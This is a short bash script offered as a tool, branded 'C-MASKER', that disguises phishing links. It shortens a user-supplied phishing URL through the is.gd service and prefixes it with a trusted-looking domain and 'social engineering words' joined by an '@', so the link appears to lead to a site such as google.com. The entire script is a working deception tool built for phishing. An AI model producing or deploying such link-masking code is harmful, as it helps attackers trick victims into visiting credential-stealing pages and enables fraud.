# Bash Script for Hide Phishing URL Created by C642Y963D4706

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "\n\e[1;31;42m######—(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(—##### \e[0m"
echo -e "\e[1;31;42m######—(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(—#####\e[0m"
echo -e "\e[1;31;42m######—(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(—##### \e[0m"
echo -e "\e[1;31;42m######—(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(—##### \e[0m"
echo -e "\e[1;31;42m######—(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(—##### \e[0m"
echo -e "\e[1;31;42m######—(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(—##### \e[0m \n"
echo -e "\e[40;38;5;82m Please Visit \e[30;48;5;82m https://www.youtube.com/channel/UCxkxhbcHQb2B8JH3j-UVArQ \e[0m"
echo -e "\e[30;48;5;82m    Copyright \e[40;38;5;82m   PBA BOMBERS ARMY \e[0m \n\n"
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m \n"
echo -n "Paste Phishing URL here (with http or https): "
read phish
url_checker $phish
sleep 1
echo "Processing and Modifing Phishing URL"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
echo 'Domain to mask the Phishing URL (with http or https), ex: https://google.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nType social engineering words:(like free-money, best-pubg-tricks)'
echo -e "\e[31mDon't use space just use '-' between social engineering words\e[0m"
echo -en "\e[32m=>\e[0m "
read words
echo -e "\nGenerating —(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(—...\n"
final=$mask-$words@$shorter
echo -e "Here is the —(••÷  🎀  𝒞-𝑀𝒜𝒮𝒦𝐸𝑅  🎀  ÷••(— URL:\e[32m ${final} \e[0m\n"
